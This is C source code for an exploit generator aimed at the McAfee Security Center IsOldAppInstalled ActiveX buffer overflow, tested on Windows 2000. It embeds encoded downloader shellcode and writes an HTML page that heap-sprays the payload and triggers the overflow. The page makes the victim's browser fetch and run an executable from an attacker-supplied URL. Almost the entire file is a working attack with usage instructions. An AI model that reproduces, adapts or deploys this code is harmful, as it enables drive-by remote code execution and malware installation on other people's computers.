/*
	McAfee Security Center IsOldAppInstalled ActiveX Buffer Overflow Vulnerability
	
	Peel the frame from axis,Thanks
	
	Test on Windows2000 and dll version Mcsubmgr.dll 6.0.0.15

	Greetz to OYXin, sowhat, Winny Thomas and 0x557 team
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

FILE *fp = NULL;
char *file = "McAfee_exploit.html";
char *url = NULL;

//Downloader shellcode
unsigned char sc[] = 
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x3c\x01\x80\x34\x0B\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x34\x99\x99\x99\xC3\x12\x6B\xAA"
"\x59\x35\xA4\x01\x99\x99\x99\xEC\x6F\x18\x75\x51\x99\x99\x99\x12"
"\x6D\x10\xCF\xBD\x71\x0C\x99\x99\x99\xAA\x42\x10\x9F\x66\xAF\xF1"
"\x17\xD7\x97\x75\x71\x34\x99\x99\x99\x10\xDF\x91\xF1\xF5\xF5\x99"
"\x99\xF1\xF6\xF7\xB7\xFD\xF1\xEC\xEB\xF5\xF4\xCD\x66\xCF\x91\x10"
"\xDF\x9D\x66\xAF\xF1\xE7\x41\x7B\xEA\x71\x11\x99\x99\x99\x10\xDF"
"\x95\x66\xAF\xF1\x01\x67\x13\x97\x71\xE0\x99\x99\x99\x10\xDF\x8D"
"\x66\xAF\xF1\xBC\x29\x66\x5B\x71\xF3\x99\x99\x99\x10\xDF\x81\x66"
"\xEF\x9D\xF1\xAF\x83\xB6\xE9\x71\xC3\x99\x99\x99\x10\xDF\x89\xF3"
"\xFC\xF1\xEA\xB7\xFC\xE1\x10\xFF\x85\x66\xEF\x85\x66\xCF\x81\xAA"
"\x50\xC8\xC8\x66\xEF\x85\x66\xEF\xBD\xC8\x66\xCF\x89\xAA\x50\xC8"
"\x66\xEF\x85\x66\xCF\x8D\x66\xCF\x95\x70\x19\x99\x99\x99\xCC\xCF"
"\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12\xD9\x95\x12\xE9\x85"
"\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31\x21\x99\x99\x99\x12"
"\x5C\xC7\xC4\x5B\x9D\x99\xCA\xCC\xCF\xCE\x12\xF5\xBD\x81\x12\xDC"
"\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12\xC3\xB9\x9A\x44\x7A"
"\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA\x59\x35\xA3\x5D\xED"
"\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD\x8D\xEC\x78\x12\xC3"
"\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D\x12\x9A"
"\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2\x5B\x9D\x99\x71\x50"
"\x67\x66\x66";
unsigned char sc_2[] = "\x98";

char * header =
"<!-- McAfee exploit:) Jambalaya-->\n\n"

"<html>\n"
"<object classid=\"clsid:9BE8D7B2-329C-442A-A4AC-ABA9D7572602\" id='target'></object>\n"
"<body>\n"
"<SCRIPT language=\"javascript\">\n"
"\tvar heapSprayToAddress = 0x05050505;\n"
"\tvar shellcode = unescape(\"%u9090\"+\"%u9090\"+ \n";




char * footer =
"\n"
"var heapBlockSize = 0x400000;\n" 
"var payLoadSize = shellcode.length * 2;\n"
"var spraySlideSize = heapBlockSize - (payLoadSize+0x38);\n"
"var spraySlide = unescape(\"%u0505%u0505\");\n"
"spraySlide = getSpraySlide(spraySlide,spraySlideSize);\n"
"heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;\n"
"memory = new Array();\n\n"
"for (i=0;i<heapBlocks;i++)\n{\n"
"\t\tmemory[i] = spraySlide + shellcode;\n}\n"

"var padding = String.fromCharCode(0x05);\n"
"while( padding.length< 500)\n"
"{\npadding +=padding;\n}\n"
"var str = padding.substring(0,500);\n"
"var arg2=\"defaultV\";\n"
"target.IsOldAppInstalled(str, arg2);\n" 

"function getSpraySlide(spraySlide, spraySlideSize)\n{\n\t"
"while (spraySlide.length*2<spraySlideSize)\n\t"
"{\n\t\tspraySlide += spraySlide;\n\t}\n"
"\tspraySlide = spraySlide.substring(0,spraySlideSize/2);\n\treturn spraySlide;\n}\n\n"
"</script>\n";



char * trigger_1 =
"</body>\n"
"</html>\n";


// print unicode shellcode
void PrintPayLoad(char *lpBuff, int buffsize)
{
int i;
for(i=0;i<buffsize;i+=2)
{
if((i%16)==0)
{
if(i!=0)
{
printf("\"\n\"");
fprintf(fp, "%s", "\" +\n\"");
}
else
{
printf("\"");
fprintf(fp, "%s", "\"");
}
}

printf("%%u%0.4x",((unsigned short*)lpBuff)[i/2]);

fprintf(fp, "%%u%0.4x",((unsigned short*)lpBuff)[i/2]);
}

printf("\";\n");
fprintf(fp, "%s", "\");\n"); 


fflush(fp);
}




void main(int argc, char **argv)
{
unsigned char buf[1024] = {0};

int sc_len = 0;
int n;


if (argc < 2)
{
	printf("#######################################\n");
	printf("#\tMcAfee Security Center IsOldAppInstalled exploit by Jambalaya:>\n");
	printf("#\ttest on Windows2000 and dll version Mcsubmgr.dll 6.0.0.15:>\n");
	printf("#\tReference : http://lists.grok.org.uk/pipermail/full-disclosure/2007-May/054183.html\n");
	printf("#\t100%% successful\? who knows\;\)\n");
	printf("\r\nUsage: %s <URL> [htmlfile]\n", argv[0]);
	printf("\r\nE.g.: %s http://www.fakename.com/hello.exe exploit.html\r\n\n", argv[0]);
exit(1);
}

url = argv[1];


if( (!strstr(url, "http://") && !strstr(url, "ftp://")) || strlen(url) < 10)
{
printf("[-] Invalid url. Must start with 'http://','ftp://'\n");
return; 
}

printf("[+] download url:%s\n", url);

if(argc >=3) file = argv[2];
printf("[+] exploit file:%s\n", file);

fp = fopen(file, "w");
if(!fp)
{
printf("[-] Open file error!\n");
return;
} 


//build evil html file
fprintf(fp, "%s", header);
fflush(fp);

memset(buf, 0, sizeof(buf));
sc_len = sizeof(sc)-1;
memcpy(buf, sc, sc_len);
memcpy(buf+sc_len, url, strlen(url));

sc_len += strlen(url);

memcpy(buf+sc_len, sc_2, 1);
sc_len += 1;

PrintPayLoad((char *)buf, sc_len);

fprintf(fp, "%s", footer);
fflush(fp); 

fprintf(fp, "%s", trigger_1);
fflush(fp); 


printf("[+] exploit write to %s success!\n", file);
}